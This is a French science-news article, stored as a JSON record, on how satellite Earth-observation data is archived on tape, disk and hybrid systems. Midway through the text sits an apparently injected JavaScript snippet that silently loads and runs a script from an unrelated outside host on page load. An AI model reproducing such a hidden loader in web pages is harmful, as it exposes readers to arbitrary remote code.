{"title": "Astronautique : les etonnantes coulisses de la gestion des donnees spatiales", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-10-24", "content": "L'exploitation des satellites d'observation de la Terre, marche en pleine croissance, genere des quantites de donnees phenomenales et qui doivent etre mises a la disposition d'une clientele tres variee. Comment archiver et gerer ce flot grandissant ? Nous avons pose la question a Michel Ackerman, Business consultant chez EBRC, et Gilbert Barrot, CIO chez ACRI-ST. Ce qu'il faut retenir Sans donnees spatiales correctement archivees, classees et d'acces rapide, les applications et les services qui les commercialisent ne pourront plus fonctionner correctement.  L'archivage des donnees spatiales est la partie la moins visible des missions spatiales et conditionne la bonne utilisation et exploitation a la fin de la mission du satellite.\r Les solutions de stockage tiennent compte de nombreux parametres dont le cout de retention au TB, la securite et la rapidite de l'accessibilite. Aujourd'hui, la quantite tres importante de donnees generees par les  satellites d'observation de la Terre  constitue un defi majeur en  matiere  de stockage, de facilite a les diffuser et d'y acceder pour les utiliser a des fins scientifiques et commerciales. A cela s'ajoute que le marche de l'exploitation de ces donnees represente une opportunite inedite pour le secteur du  New Space , des  start-up  de la Silicon Valley et des grands acteurs des  TIC  (technologies de l'information et de la communication) tels que les Gafa ( Google , Apple, Facebook, Amazon). Tous s'appuient sur la production et le traitement des donnees satellitaires pour fournir des services a valeurs ajoutees a une tres grande variete d'utilisateurs. Pour repondre a ce besoin, ces donnees sont gerees par les agences spatiales mais aussi des societes, comme la francaise ACRI-ST, en charge du traitement et de l'archivage des donnees satellitaires strategiques de l' Agence spatiale europeenne  (EODAS). Elle s'est recemment rapprochee des services cloud d'EBRC pour migrer une partie des donnees dans ses  data centers  et d'etre prete, a terme, a faire face a une volumetrie massive rendant tout futur transfert soit trop long, soit trop couteux. Pour prendre un exemple dans un domaine comparable, rien que le satellite  Sentinel 3A  (fevrier 2016) du programme Copernicus, produit quelques teraoctets quotidiennement. La volumetrie globale des donnees passe ainsi rapidement de quelques  << dizaines de terabytes a plusieurs petabytes >> , nous expliquent Michel Ackerman, Business consultant chez EBRC et Gilbert Barrot, CIO chez ACRI-ST. Le travail de gestion de cette  masse  d'information est essentiel. En effet, il faut savoir que si les donnees de ce programme de la Commission europeenne sont mises gratuitement a disposition des utilisateurs du monde entier, elles le sont a l'etat brut. Aux utilisateurs ensuite de voir comment les utiliser et les commercialiser. D'ou l'importance de l'archivage et le role fondamental des acteurs comme ACRI-ST.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Deux categories de supports d'archivages de donnees spatiales Aujourd'hui, pour archiver les donnees il existe globalement deux categories de supports. Le  << choix du support de stockage depend en tres grande partie de l'utilisation finale >> . Dans le cas ou les donnees doivent etre preservees sur une longue  duree , le support le plus adapte reste la bande  << avec un cout de retention au TB [teraoctet] tres bas et offrant une fiabilite plus importante que dans le passe >> . De plus, les dernieres evolutions technologiques diminuent fortement l'impact sur l'environnement avec  << une consommation electrique tres faible pour une densite tres elevee (la densite offerte en 2017 est de 8 petaoctets par rack de 42U avec des solutions de type LTO8) >> . Un data center d'ACRI-ST. (c) ACRI-ST                               D'un autre cote, pour des services necessitant un acces aleatoire, et pour lesquels chacune des donnees de l'archive peut etre demandee sur base d'un temps de reponse rapide,  << le support le mieux adapte reste le disque >> . Enfin, il existe aussi des  << systemes  hybrides  permettant un acces rapide a une fraction de l'archive (cache sur disque), le reste etant place sur bande >> . Cette solution articulee autour de la  frequence  d'utilisation repond aux cas d'usages d'utilisateurs qui ont besoin d'acceder a des donnees recentes qui  << seront ecrites sur disque et disponibles en mode rapide et qui ponctuellement accederont a des enregistrements plus anciens qui, eux, seront places sur bande >> . Dans ce contexte, des solutions automatisees existent, basees sur du <<  tiering  >>, c'est-a-dire la migration automatique ou programmee de donnees entre systemes de stockage plus ou moins performants, donc plus ou moins couteux. Ces migrations, internes au systeme de stockage, sont entierement transparentes pour l'utilisateur de la donnee. Seul le temps d'acces va varier. Le bel avenir du stockage sur bande Le classement de ces  donnees spatiales , est realise en leur associant  << des metadonnees (etiquetage) qui sont des informations descriptives, telles que : type, plage temporelle, geolocalisation, indices de qualite ainsi que des informations specifiques aux differents metiers >> . Ces metadonnees vont permettre de qualifier les jeux de donnees sans avoir a y acceder en profondeur ou a les traiter (tri, filtrage...)  << comme effectuer les operations de tri et de filtrage necessites par les services offerts aux utilisateurs >> . Le format de mise a disposition de la donnee, depend des environnements metiers, les  << methodes de transfert les plus frequentes sont basees sur les preconisations et outils de l'OGC (Open Geospatial Consortium) : WMS, WPS, CWS, etc. >> . Concernant l' avenir du stockage , il est  << difficile aujourd'hui de vraiment predire l'evolution du stockage massif a long terme >> . Pour les prochaines annees, la tendance du stockage pour les petites volumetries sera  << sans aucun doute d'opter pour des supports  SSD  >>  par contre pour le stockage massif, les  << classiques disques rotatifs et les bandes resteront encore les supports privilegies >> . La date de la bascule entre ces differents supports est  << encore tres largement incertaine et nous sommes plutot devant un  mouvement  de transition permanente integrant sans cesse les nouveaux developpements >> . Le tarif actuel des SSD n'est pas compatible avec un stockage massif.  << Seule une diminution tres importante de leur prix permettra son utilisation comme support d'archivage. >> De son cote, le stockage sur bande,  << outre son cout au TB qui reste de loin le plus faible parmi les differents systemes >> , de nouvelles opportunites s'ouvrent a lui,  << en particulier concernant les cyberattaques >> . La sauvegarde sur bandes offre l'avantage d'une copie parfois plus securisee dont le modele sequentiel est << plus fige >> que sur disque. Ainsi, en cas de cyberattaque par  malware , les donnees ne  << sont naturellement pas accessibles en direct par le  virus  et se trouvent ainsi mieux protegees par defaut >> . Peu importe le choix technologique opere, la  << fiabilite restera toujours au coeur de ces differents supports et les nouveautes ou evolutions qui pourront egalement apparaitre >> . Venus : des images satellite de la Terre sans nuage                       Les satellites permettent d'observer la Terre avec une grande precision. Mais cette possibilite est souvent entravee par la presence de nuages. Le Cnes nous parle au cours de cette video de Venus, un satellite qui permettra d'obtenir des images sans aucune de ces perturbations.                                       ", "theme": "sciences"}